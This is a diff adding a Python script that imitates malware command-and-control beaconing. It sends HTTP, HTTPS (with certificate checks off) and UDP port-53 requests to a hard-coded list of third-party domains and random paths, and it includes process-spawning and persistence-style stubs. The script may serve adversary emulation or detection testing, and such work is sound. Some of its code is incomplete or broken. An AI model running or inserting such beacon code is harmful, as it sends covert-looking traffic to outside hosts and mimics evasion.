@@ -1,0 +1,116 @@
+#!/usr/bin/python
+import os, errno
+from multiprocessing import Process, Array
+import time, random
+from threading import Timer
+from setproctitle import setproctitle
+import requests, socket, hashlib, json
+
+DOMAINS=[
+  'johntheripper.com',
+  'directories.net',
+  'waterfallsolutions.com',
+  'fastcars.com',
+  'greasedwheels.com',
+  'candycrushed.net',
+  'facebook.net',
+  'terminal.biz',
+  'cdn.crafty.net',
+  'simple-egress.com',
+  'busybee.net',
+  'aftershock.com']
+
+FILES=[
+  'tutorial',
+  'home',
+  'cd.ico',
+  'family.jpeg',
+  'index.php',
+  'index.html',
+  'webdesign',
+  'x.pixel',
+  'site',
+  'work',
+  'computer',
+  'software',
+  'help',
+  'cron',
+  'wall',
+  'test',
+  'dir',
+  'admin',
+  'back',
+  'generator',
+  'jail',
+  'update',
+  'blog',
+  'portfolio',
+  'destination']
+
+def dns_beacon(name):
+    pass
+
+
+def udp_beacon(host, path):
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.settimeout(2)
+        sock.sendto(json.dumps({'Path': path}), (host, 53))
+        check = checksum(sock.recv(4096))
+        sock.sendto(json.dumps({'Check': check, 'Path': path}), (host, 53))
+        sock.close()
+    except Exception as e:
+        print(e)
+        return
+
+
+def https_beacon(url):
+    try:
+        res = requests.get(url, verify=False)
+        check = checksum(res.text)
+        requests.post(url, data = {'check':check}, verify=False)
+    except:
+        return
+
+
+def http_beacon(url):
+    try:
+        res = requests.get(url)
+        check = checksum(res.text)
+        requests.post(url, data = {'check':check})
+    except:
+        return
+    
+
+def checksum(data): 
+    s = hashlib.sha1()
+    s.update(data)
+    check = s.hexdigest()
+    return check
+
+def startproc(ring, actors):
+    for i in range(random.randint(10, 500)):
+        Process(target=exit, args=[0]).start()
+    p = Process(target=persistence_ring, args=(ring, actors))
+    p.daemon = True
+    p.start()
+
+
+def exec_beacons():
+    http_beacon('http://%s/%s' % get_random_domainfile())
+    time.sleep(random.random() * 5)
+    https_beacon('https://%s/%s' % get_random_domainfile())
+    time.sleep(random.random() * 5)
+    domain, f = get_random_domainfile()
+    udp_beacon(domain, f)
+
+
+def get_random_domainfile():
+    global DOMAINS, FILES
+    domain = random.choice(DOMAINS)
+    f = random.choice(FILES)
+    return (domain, f)
+
+
+if __name__ == '__main__':
+    exec_beacons()
